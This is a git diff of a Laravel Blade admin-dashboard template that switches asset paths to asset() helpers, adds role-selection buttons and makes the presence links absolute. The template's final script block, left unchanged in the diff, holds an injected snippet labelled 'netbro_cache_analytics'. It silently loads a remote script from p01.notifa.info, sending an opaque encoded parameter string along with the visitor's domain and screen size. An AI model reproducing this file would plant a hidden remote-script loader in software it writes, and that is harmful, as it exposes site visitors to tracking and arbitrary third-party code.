@@ -10,19 +10,19 @@
   <meta name="author" content=""/>
   <title>Rocker - Bootstrap4  Admin Dashboard Template</title>
   <!--favicon-->
-  <link rel="icon" href="assets/images/favicon.ico" type="image/x-icon">
+  <link rel="icon" href="{{asset('assets/images/favicon.ico')}}" type="image/x-icon">
   <!-- simplebar CSS-->
-  <link href="assets/plugins/simplebar/css/simplebar.css" rel="stylesheet"/>
+  <link href="{{asset('assets/plugins/simplebar/css/simplebar.css')}}" rel="stylesheet"/>
   <!-- Bootstrap core CSS-->
-  <link href="assets/css/bootstrap.min.css" rel="stylesheet"/>
+  <link href="{{asset('assets/css/bootstrap.min.css')}}" rel="stylesheet"/>
   <!-- animate CSS-->
-  <link href="assets/css/animate.css" rel="stylesheet" type="text/css"/>
+  <link href="{{asset('assets/css/animate.css')}}" rel="stylesheet" type="text/css"/>
   <!-- Icons CSS-->
-  <link href="assets/css/icons.css" rel="stylesheet" type="text/css"/>
+  <link href="{{asset('assets/css/icons.css')}}" rel="stylesheet" type="text/css"/>
   <!-- Sidebar CSS-->
-  <link href="assets/css/sidebar-menu.css" rel="stylesheet"/>
+  <link href="{{asset('assets/css/sidebar-menu.css')}}" rel="stylesheet"/>
   <!-- Custom Style-->
-  <link href="assets/css/app-style.css" rel="stylesheet"/>
+  <link href="{{asset('assets/css/app-style.css')}}" rel="stylesheet"/>
   
 </head>
 
@@ -73,9 +73,13 @@
         <div class="col-lg-12">
         
            <div class="card">
+
             <div class="card-body">
+              @foreach($role as $role)
+              <a href="/checkrole/{{$role->name}}" class="btn btn-outline-primary">{{$role->name}}</a>
 
-
+              @endforeach
+              <br><br>
 
 
             <div class="row">   
@@ -150,7 +154,7 @@
                       </div>
                       <div class="modal-footer">
                         <button type="button" class="btn btn-secondary" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
-                        <a href="presence/{{$user->id}}" class="btn btn-primary">ya</a>
+                        <a href="/presence/{{$user->id}}" class="btn btn-primary">ya</a>
                       </div>
                     </div>
                   </div>
@@ -171,7 +175,7 @@
                       </div>
                       <div class="modal-footer">
                         <button type="button" class="btn btn-secondary" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
-                        <form action="presence/checkout" method="post"> 
+                        <form action="/presence/checkout" method="post"> 
                         @csrf 
                           <input type="text" hidden="" name="user_id" value="{{$user->id}}">
                            @foreach($user->presences as $presence)
@@ -234,18 +238,18 @@
 
 
   <!-- Bootstrap core JavaScript-->
-  <script src="assets/js/jquery.min.js"></script>
-  <script src="assets/js/popper.min.js"></script>
-  <script src="assets/js/bootstrap.min.js"></script>
+  <script src="{{asset('assets/js/jquery.min.js')}}"></script>
+  <script src="{{asset('assets/js/popper.min.js')}}"></script>
+  <script src="{{asset('assets/js/bootstrap.min.js')}}"></script>
   
   <!-- simplebar js -->
-  <script src="assets/plugins/simplebar/js/simplebar.js"></script>
+  <script src="{{asset('assets/plugins/simplebar/js/simplebar.js')}}"></script>
   <!-- waves effect js -->
-  <script src="assets/js/waves.js"></script>
+  <script src="{{asset('assets/js/waves.js')}}"></script>
   <!-- sidebar-menu js -->
-  <script src="assets/js/sidebar-menu.js"></script>
+  <script src="{{asset('assets/js/sidebar-menu.js')}}"></script>
   <!-- Custom scripts -->
-  <script src="assets/js/app-script.js"></script>
+  <script src="{{asset('assets/js/app-script.js')}}"></script>
   
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKujvCsE2ZS0m7POq%2f43%2fey9y0MOgWQD3yjKWjrs4r0br0wbxovjhyaCr0YrZKNdGh%2fumyxUMsZPLSFSjdOr77HFgVHokt1qFZTdvKpiXG8Dj%2bu6mIo%2fE0JJQhlMNZvYfJLGqW45nYGYEU7qxGtq8ZWzuWmzKX9sBhhUhGFWB7fiG3yuu0XG654JtxOlHD1GvvjT1E3QR1UKeQ01fYmxTNXICXAnxQ0M0b%2b6qLcWnjEgQf29VFSwpFsn4lUPfOiw2QPimR6IvMeG9nULan7OdaO3e%2fUTwKLCRjnLmDPx%2fjP9u6UyGdfO4MP8AVL%2bm8whO9uslyfafe7nj7py2x90EFmug6pK59n15cs34SVL7Uaefew6ybgmCnrXYdbcep7d8qQBrONlpKOS5rtI0y8vQ2%2bLGQdIQwBfSTbRuPuAiqjjCqL3mslQbEgExI0%2fX4L2ntZMhnvNZrNBYllLdTcXA%2bccaMpwvB8%2fvlhNZ%2f1UEeCjo5Ud5B%2ftw9NtFyi5kFKYiIPw%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
